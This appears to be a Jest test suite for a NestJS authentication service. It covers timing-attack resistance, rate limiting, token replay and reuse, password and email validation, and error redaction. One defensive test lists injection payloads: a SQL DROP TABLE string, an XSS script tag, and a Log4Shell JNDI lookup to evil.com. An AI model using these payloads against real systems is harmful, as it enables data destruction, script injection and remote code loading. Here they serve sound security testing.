import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AuthService } from './auth.service';
import { MagicLinkService } from './magic-link.service';
import { ApiKeyService } from './api-key.service';
import { JwtTokenService } from './jwt-token.service';
import { PrismaService } from '../prisma/prisma.service';
import { ConfigService } from '@nestjs/config';
import { JwtService } from '@nestjs/jwt';
import { MetricsService } from '../metrics/metrics.service';
import { EnqueueService } from '../queues/email/enqueue/enqueue.service';
import * as bcrypt from 'bcryptjs';
import { createMockUser } from '../../test/test-utils/mocks';
import { createTestApp, closeTestApp, TestContext } from '../../test/test-utils/integration-helpers';

// Mock bcrypt for consistent testing
jest.mock('bcryptjs');
const mockBcrypt = bcrypt as jest.Mocked<typeof bcrypt>;

describe('Authentication Security Tests', () => {
  let context: TestContext;
  let authService: AuthService;
  let magicLinkService: MagicLinkService;
  let apiKeyService: ApiKeyService;
  let jwtTokenService: JwtTokenService;

  beforeAll(async () => {
    context = await createTestApp();
    authService = context.app.get<AuthService>(AuthService);
    magicLinkService = context.app.get<MagicLinkService>(MagicLinkService);
    apiKeyService = context.app.get<ApiKeyService>(ApiKeyService);
    jwtTokenService = context.app.get<JwtTokenService>(JwtTokenService);
  });

  afterAll(async () => {
    await closeTestApp(context);
  });

  beforeEach(() => {
    jest.clearAllMocks();
    mockBcrypt.hash.mockResolvedValue('hashed-value' as never);
    mockBcrypt.compare.mockResolvedValue(true as never);
  });

  describe('Timing Attack Protection', () => {
    it('should have consistent response times for API key validation', async () => {
      const validApiKey = 'valid-api-key-12345678901234567890123456789012';
      const invalidApiKey = 'invalid-api-key-12345678901234567890123456789012';
      const mockUser = createMockUser();

      // Mock database responses
      context.prismaService.user.findMany.mockResolvedValue([mockUser]);
      mockBcrypt.compare
        .mockResolvedValueOnce(true as never) // valid key
        .mockResolvedValueOnce(false as never); // invalid key

      // Measure response times
      const validStart = Date.now();
      await apiKeyService.validateApiKey(validApiKey);
      const validDuration = Date.now() - validStart;

      const invalidStart = Date.now();
      await apiKeyService.validateApiKey(invalidApiKey);
      const invalidDuration = Date.now() - invalidStart;

      // Response times should be within 50ms of each other
      const timeDifference = Math.abs(validDuration - invalidDuration);
      expect(timeDifference).toBeLessThan(50);
    });

    it('should prevent email enumeration in signup', async () => {
      const existingEmail = 'existing@example.com';
      const newEmail = 'new@example.com';
      const mockUser = createMockUser({ email: existingEmail });

      // Mock existing user for first email, no user for second
      context.prismaService.user.findUnique
        .mockResolvedValueOnce(mockUser) // existing email
        .mockResolvedValueOnce(null); // new email

      const existingStart = Date.now();
      try {
        await authService.signup(existingEmail, 'StrongPass123!');
      } catch (error) {
        // Expected to fail
      }
      const existingDuration = Date.now() - existingStart;

      const newStart = Date.now();
      try {
        await authService.signup(newEmail, 'StrongPass123!');
      } catch (error) {
        // May fail due to mocking
      }
      const newDuration = Date.now() - newStart;

      // Response times should be similar to prevent enumeration
      const timeDifference = Math.abs(existingDuration - newDuration);
      expect(timeDifference).toBeLessThan(100);
    });

    it('should prevent email enumeration in magic link requests', async () => {
      const existingEmail = 'existing@example.com';
      const nonExistentEmail = 'nonexistent@example.com';
      const mockUser = createMockUser({ email: existingEmail });

      context.prismaService.user.findUnique
        .mockResolvedValueOnce(mockUser) // existing user
        .mockResolvedValueOnce(null); // non-existent user

      context.prismaService.magicLinkToken.count.mockResolvedValue(0);
      context.prismaService.magicLinkToken.create.mockResolvedValue({} as any);

      const existingStart = Date.now();
      await magicLinkService.sendMagicLink(existingEmail);
      const existingDuration = Date.now() - existingStart;

      const nonExistentStart = Date.now();
      await magicLinkService.sendMagicLink(nonExistentEmail);
      const nonExistentDuration = Date.now() - nonExistentStart;

      // Response times should be similar
      const timeDifference = Math.abs(existingDuration - nonExistentDuration);
      expect(timeDifference).toBeLessThan(100);
    });
  });

  describe('Rate Limiting Security', () => {
    it('should enforce rate limits on magic link requests', async () => {
      const email = 'test@example.com';
      const mockUser = createMockUser({ email });

      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.magicLinkToken.count
        .mockResolvedValueOnce(0) // first request
        .mockResolvedValueOnce(1) // second request
        .mockResolvedValueOnce(2) // third request
        .mockResolvedValueOnce(3); // fourth request (should be rate limited)

      context.prismaService.magicLinkToken.create.mockResolvedValue({} as any);

      // First 3 requests should succeed
      await expect(magicLinkService.sendMagicLink(email)).resolves.not.toThrow();
      await expect(magicLinkService.sendMagicLink(email)).resolves.not.toThrow();
      await expect(magicLinkService.sendMagicLink(email)).resolves.not.toThrow();

      // Fourth request should be silently rate limited (no error thrown)
      await expect(magicLinkService.sendMagicLink(email)).resolves.not.toThrow();

      // Verify that create was only called 3 times
      expect(context.prismaService.magicLinkToken.create).toHaveBeenCalledTimes(3);
    });

    it('should handle concurrent API key validation requests', async () => {
      const apiKey = 'test-api-key-12345678901234567890123456789012';
      const mockUser = createMockUser();

      context.prismaService.user.findMany.mockResolvedValue([mockUser]);
      mockBcrypt.compare.mockResolvedValue(true as never);

      // Make 10 concurrent requests
      const promises = Array.from({ length: 10 }, () => apiKeyService.validateApiKey(apiKey));

      const results = await Promise.all(promises);

      // All should succeed and return the same user
      results.forEach(result => {
        expect(result.isValid).toBe(true);
        expect(result.user.id).toBe(mockUser.id);
      });
    });
  });

  describe('Token Security', () => {
    it('should detect and prevent JWT token replay attacks', async () => {
      const mockUser = createMockUser();
      const mockRefreshToken = {
        id: 'token-id',
        userId: mockUser.id,
        tokenHash: 'hashed-token',
        expiresAt: new Date(Date.now() + 3600000),
        lastUsedAt: new Date(), // Just used
        usageCount: 1,
        user: mockUser,
      };

      context.prismaService.refreshToken.findFirst.mockResolvedValue(mockRefreshToken);
      context.prismaService.refreshToken.update.mockResolvedValue(mockRefreshToken);

      const refreshToken = 'valid-refresh-token';

      // First refresh should succeed
      const result1 = await jwtTokenService.refreshAccessToken(refreshToken);
      expect(result1.accessToken).toBeDefined();

      // Immediate second refresh (within 1 second) should log warning but still work
      // This tests the replay attack detection logging
      const result2 = await jwtTokenService.refreshAccessToken(refreshToken);
      expect(result2.accessToken).toBeDefined();
    });

    it('should revoke all tokens on hash mismatch', async () => {
      const mockUser = createMockUser();
      const mockRefreshToken = {
        id: 'token-id',
        userId: mockUser.id,
        tokenHash: 'hashed-token',
        expiresAt: new Date(Date.now() + 3600000),
        lastUsedAt: null,
        usageCount: 0,
        user: mockUser,
      };

      context.prismaService.refreshToken.findFirst.mockResolvedValue(mockRefreshToken);
      context.prismaService.refreshToken.deleteMany.mockResolvedValue({
        count: 5,
      });
      mockBcrypt.compare.mockResolvedValue(false as never); // Hash mismatch

      const refreshToken = 'invalid-refresh-token';

      await expect(jwtTokenService.refreshAccessToken(refreshToken)).rejects.toThrow(
        'Invalid refresh token',
      );

      // Verify that all tokens were revoked
      expect(context.prismaService.refreshToken.deleteMany).toHaveBeenCalledWith({
        where: { userId: mockUser.id },
      });
    });

    it('should validate JWT token structure thoroughly', async () => {
      const invalidTokens = [
        '', // empty
        'invalid', // not a JWT
        'header.payload', // missing signature
        'header.payload.signature.extra', // too many parts
      ];

      for (const token of invalidTokens) {
        const result = await jwtTokenService.validateToken(token);
        expect(result.isValid).toBe(false);
      }
    });

    it('should handle expired tokens gracefully', async () => {
      const expiredToken = 'expired-jwt-token';

      // Mock JWT service to throw expired error
      const jwtService = context.app.get<JwtService>(JwtService);
      jest.spyOn(jwtService, 'verifyAsync').mockRejectedValue(new Error('jwt expired'));

      const result = await jwtTokenService.validateToken(expiredToken);
      expect(result.isValid).toBe(false);
    });
  });

  describe('Magic Link Security', () => {
    it('should validate magic link token format strictly', async () => {
      const invalidTokens = [
        '', // empty
        'short', // too short
        'a'.repeat(63), // 63 chars (should be 64)
        'a'.repeat(65), // 65 chars (should be 64)
        'invalid-chars-!@#$%^&*()_+{}|:<>?[]\\;\'",./`~', // invalid characters
      ];

      for (const token of invalidTokens) {
        await expect(magicLinkService.validateMagicLink(token)).rejects.toThrow(
          'Invalid magic link token',
        );
      }
    });

    it('should cleanup expired tokens properly', async () => {
      const expiredTokens = [
        {
          id: '1',
          email: 'test1@example.com',
          expiresAt: new Date(Date.now() - 1000),
        },
        {
          id: '2',
          email: 'test2@example.com',
          expiresAt: new Date(Date.now() - 2000),
        },
      ];

      context.prismaService.magicLinkToken.findMany.mockResolvedValue(expiredTokens);
      context.prismaService.magicLinkToken.deleteMany.mockResolvedValue({
        count: 2,
      });

      const count = await magicLinkService.cleanupExpiredTokens();
      expect(count).toBe(2);
    });

    it('should prevent magic link token reuse', async () => {
      const token =
        'valid-magic-token-12345678901234567890123456789012345678901234567890123456789012';
      const mockUser = createMockUser();
      const mockMagicToken = {
        id: 'token-id',
        tokenHash: 'hashed-token',
        email: mockUser.email,
        expiresAt: new Date(Date.now() + 900000),
      };

      context.prismaService.magicLinkToken.findMany.mockResolvedValue([mockMagicToken]);
      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);
      context.prismaService.magicLinkToken.delete.mockResolvedValue(mockMagicToken);

      // First use should succeed
      const result1 = await magicLinkService.validateMagicLink(token);
      expect(result1.user.id).toBe(mockUser.id);

      // Token should be deleted after first use
      expect(context.prismaService.magicLinkToken.delete).toHaveBeenCalledWith({
        where: { id: mockMagicToken.id },
      });

      // Second use should fail (token no longer exists)
      context.prismaService.magicLinkToken.findMany.mockResolvedValue([]);

      await expect(magicLinkService.validateMagicLink(token)).rejects.toThrow(
        'Invalid or expired magic link',
      );
    });
  });

  describe('Password Security', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        '123', // too short
        'password', // no uppercase, numbers, or special chars
        'Password', // no numbers or special chars
        'Password123', // no special chars
        'password123!', // no uppercase
        'PASSWORD123!', // no lowercase
      ];

      for (const password of weakPasswords) {
        await expect(authService.signup('test@example.com', password)).rejects.toThrow(
          'Password does not meet security requirements',
        );
      }
    });

    it('should hash passwords with sufficient rounds', async () => {
      const password = 'StrongPass123!';
      const email = 'test@example.com';
      const mockUser = createMockUser({ email });

      context.prismaService.user.findUnique.mockResolvedValue(null);
      context.prismaService.user.create.mockResolvedValue(mockUser);

      await authService.signup(email, password);

      // Verify bcrypt.hash was called with 12 rounds
      expect(mockBcrypt.hash).toHaveBeenCalledWith(password, 12);
    });

    it('should prevent password reset token reuse', async () => {
      const token = 'reset-token-123';
      const newPassword = 'NewStrongPass123!';
      const mockUser = createMockUser({
        resetToken: 'hashed-token',
        resetTokenExpires: new Date(Date.now() + 3600000),
      });

      context.prismaService.user.findMany.mockResolvedValue([mockUser]);
      context.prismaService.user.update.mockResolvedValue(mockUser);

      // First use should succeed
      const result1 = await authService.resetPassword(token, newPassword);
      expect(result1).toBe(true);

      // Verify token was cleared
      expect(context.prismaService.user.update).toHaveBeenCalledWith({
        where: { id: mockUser.id },
        data: {
          password: expect.any(String),
          resetToken: null,
          resetTokenExpires: null,
        },
      });

      // Second use should fail (token cleared)
      context.prismaService.user.findMany.mockResolvedValue([]);

      const result2 = await authService.resetPassword(token, newPassword);
      expect(result2).toBe(false);
    });
  });

  describe('Input Validation Security', () => {
    it('should validate email format strictly', async () => {
      const invalidEmails = [
        '', // empty
        'invalid', // no @ symbol
        '@example.com', // no local part
        'test@', // no domain
        'test@.com', // invalid domain
        'test@example.', // incomplete domain
        'test..test@example.com', // consecutive dots
        'test@example..com', // consecutive dots in domain
        'a'.repeat(255) + '@example.com', // too long
      ];

      for (const email of invalidEmails) {
        await expect(authService.signup(email, 'StrongPass123!')).rejects.toThrow(
          'Invalid email format',
        );
      }
    });

    it('should sanitize input to prevent injection attacks', async () => {
      const maliciousInputs = [
        "test@example.com'; DROP TABLE users; --",
        'test@example.com<script>alert("xss")</script>',
        'test@example.com${jndi:ldap://evil.com/a}',
      ];

      const mockUser = createMockUser();
      context.prismaService.user.findUnique.mockResolvedValue(null);
      context.prismaService.user.create.mockResolvedValue(mockUser);

      for (const maliciousEmail of maliciousInputs) {
        // Should either reject invalid format or sanitize
        try {
          await authService.signup(maliciousEmail, 'StrongPass123!');
        } catch (error) {
          expect(error.message).toContain('Invalid email format');
        }
      }
    });
  });

  describe('Session Security', () => {
    it('should limit concurrent sessions per user', async () => {
      const mockUser = createMockUser();
      const existingTokens = Array.from({ length: 6 }, (_, i) => ({
        id: `token-${i}`,
        userId: mockUser.id,
        createdAt: new Date(Date.now() - i * 1000),
      }));

      context.prismaService.refreshToken.findMany.mockResolvedValue(existingTokens);
      context.prismaService.refreshToken.deleteMany.mockResolvedValue({
        count: 1,
      });
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);

      await jwtTokenService.generateTokenPair(mockUser);

      // Should cleanup old tokens when limit exceeded
      expect(context.prismaService.refreshToken.deleteMany).toHaveBeenCalled();
    });

    it('should track device information for security', async () => {
      const mockUser = createMockUser();
      const deviceInfo = {
        deviceId: 'test-device-123',
        ipAddress: '192.168.1.100',
      };

      context.prismaService.refreshToken.findMany.mockResolvedValue([]);
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);

      await jwtTokenService.generateTokenPair(mockUser, deviceInfo);

      expect(context.prismaService.refreshToken.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          deviceId: deviceInfo.deviceId,
          ipAddress: deviceInfo.ipAddress,
        }),
      });
    });
  });

  describe('API Security', () => {
    it('should validate API key format before processing', async () => {
      const invalidApiKeys = [
        '', // empty
        'short', // too short
        null, // null
        undefined, // undefined
      ];

      for (const apiKey of invalidApiKeys) {
        const result = await apiKeyService.validateApiKey(apiKey as any);
        expect(result.isValid).toBe(false);
      }
    });

    it('should generate cryptographically secure API keys', async () => {
      const mockUser = createMockUser();
      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);

      const result = await apiKeyService.generateApiKey(mockUser.id);

      // API key should be 64 characters (32 bytes hex)
      expect(result.apiKey).toHaveLength(64);
      expect(result.apiKey).toMatch(/^[a-f0-9]{64}$/);
    });

    it('should track API usage for security monitoring', async () => {
      const mockUser = createMockUser();
      const apiKey = 'test-api-key-12345678901234567890123456789012';
      const usageInfo = {
        endpoint: '/api/test',
        method: 'GET',
        statusCode: 200,
        duration: 100,
        ipAddress: '192.168.1.100',
        userAgent: 'Test Agent',
        timestamp: new Date(),
      };

      context.prismaService.user.findMany.mockResolvedValue([mockUser]);
      context.prismaService.apiUsage.count.mockResolvedValue(50); // Under limit
      context.prismaService.apiUsage.create.mockResolvedValue({} as any);
      context.prismaService.user.update.mockResolvedValue(mockUser);

      const result = await apiKeyService.validateApiKey(apiKey, usageInfo);

      expect(result.isValid).toBe(true);
      expect(context.prismaService.apiUsage.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          userId: mockUser.id,
          endpoint: usageInfo.endpoint,
          method: usageInfo.method,
          statusCode: usageInfo.statusCode,
          ipAddress: usageInfo.ipAddress,
        }),
      });
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test database error handling
      context.prismaService.user.findUnique.mockRejectedValue(
        new Error('Database connection failed: password=secret123'),
      );

      await expect(authService.signup('test@example.com', 'StrongPass123!')).rejects.toThrow(
        'Could not create user',
      );
    });

    it('should log security events without exposing sensitive data', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

      await expect(
        authService.validateUser('test@example.com', 'wrong-password'),
      ).resolves.toBeNull();

      // Verify no sensitive data in logs
      const logCalls = consoleSpy.mock.calls.flat().join(' ');
      expect(logCalls).not.toContain('wrong-password');
      expect(logCalls).not.toContain('secret');
      expect(logCalls).not.toContain('token');

      consoleSpy.mockRestore();
    });
  });
});
